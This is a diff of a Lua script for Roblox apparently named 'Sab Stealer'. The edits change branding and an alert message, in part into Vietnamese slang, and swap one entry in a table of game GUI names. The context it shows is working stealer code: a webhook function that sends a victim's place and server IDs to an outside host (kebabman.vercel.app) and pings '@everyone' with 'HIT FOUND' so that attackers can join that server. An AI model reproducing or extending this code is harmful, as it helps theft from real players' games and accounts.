@@ -270,7 +270,7 @@ local function sendWebhook(link)
     local jobId = tostring(game.JobId or "")
     local serverLink = ("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)
     local embed = {
-        ["title"] = "😜 Sab Stealer - Make By Phatlee",
+        ["title"] = "😜 Sab Stealer - Private",
         ["color"] = serverType == "PUBLIC SERVER" and 16711680 or 65280,
         ["fields"] = {
             { ["name"] = "Hit By", ["value"] = "Sync" },
@@ -286,7 +286,7 @@ local function sendWebhook(link)
         }
     }
     local payload = {
-        ["content"] = "📣 @everyone **HIT FOUND!!!!!**\n" .. (link or ("Server detected: " .. serverType)),
+        ["content"] = "📣 @everyone **HIT KÌA MẤY KU!!!!!**\n" .. (link or ("Server detected: " .. serverType)),
         ["embeds"] = {embed},
         ["allowed_mentions"] = { ["parse"] = {"everyone"} }
     }
@@ -646,7 +646,7 @@ task.spawn(function()
         ["ShopNPCCash"] = true,
         ["Shop"] = true,
         ["RobuxShop"] = true,
-        ["FuseMachine"] = true,
+        ["Brainrot Trader"] = true,
         ["CraftingMachine"] = true,
     }
 
